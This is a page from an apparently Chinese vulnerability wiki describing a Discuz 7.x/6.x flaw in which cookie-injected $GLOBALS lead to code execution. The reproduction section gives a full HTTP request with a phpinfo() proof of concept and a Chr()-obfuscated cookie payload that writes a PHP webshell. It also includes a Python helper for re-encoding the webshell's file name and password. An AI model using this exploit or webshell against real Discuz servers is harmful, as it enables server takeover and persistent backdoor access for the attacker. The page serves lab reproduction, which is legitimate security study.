@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/CMS%E6%BC%8F%E6%B4%9E/Discuz%207.x6.x%20%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz 7.x/6.x \u5168\u5c40\u53d8\u91cf\u9632\u5fa1\u7ed5\u8fc7\u5bfc\u81f4\u4ee3\u7801\u6267\u884c", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz!X 3.4 admincp_setting.php 后台SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%203.4%20%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%203.4%20%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Discuz 3.4 最新版后台getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-7x6x">Discuz 7.x/6.x 全局变量防御绕过导致代码执行<a class="headerlink" href="#discuz-7x6x" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，也就是说默认配置下<code>$_REQUEST</code>只包含<code>$_GET</code>和<code>$_POST</code>而不包括$_COOKIE。</p>
+<p>我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
+<p>具体原理请参考：</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub执行如下命令启动Discuz 7.2：</p>
+<div class="highlight"><pre><span></span><code>docker-compose up -d
+</code></pre></div>
+<p>启动后，访问<code>http://your-ip:8080/install/</code>来安装discuz，数据库地址填写<code>db</code>，数据库名为<code>discuz</code>，数据库账号密码均为<code>root</code>。</p>
+<p><img alt="image-20220222112715390" src="../images/202202221127521.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p>
+<div class="highlight"><pre><span></span><code>GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+Connection: close
+</code></pre></div>
+<p><img alt="image-20220222112923996" src="../images/202202221129105.png" /></p>
+<p>同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd</p>
+<div class="highlight"><pre><span></span><code>Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
+</code></pre></div>
+<p>ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码：</p>
+<div class="highlight"><pre><span></span><code>import re
+# ASCII = ord(Word)
+# Word = chr(ASCII)
+
+# ASCII -&gt; Word
+def ASCII2word(ASCIIs):
+    for c in re.findall(r&quot;(\d+)&quot;, ASCIIs):
+        print(chr(int(c)),end=&quot;&quot;)
+
+# Word -&gt; ASCII
+def word2ASCII(words):
+    ASCIIs = &quot;&quot;
+    for word in words:
+        ASCIIs += &quot;Chr(&quot; + str(ord(word)) + &quot;).&quot;
+    print(ASCIIs)
+
+print(&quot;----------ASCII TO WORD---------------------&quot;)
+
+asciis = &quot;Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)&quot;
+ASCII2word(asciis)
+
+print(&quot;\n\n----------WORD TO ASCII--------------------&quot;)
+
+words = &quot;fputs(fopen(&#39;x.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[pwd])?&gt;&#39;);&quot;
+word2ASCII(words)
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21X%203.4%20admincp_setting.php%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz!X 3.4 admincp_setting.php 后台SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%203.4%20%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%203.4%20%E6%9C%80%E6%96%B0%E7%89%88%E5%90%8E%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Discuz 3.4 最新版后台getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
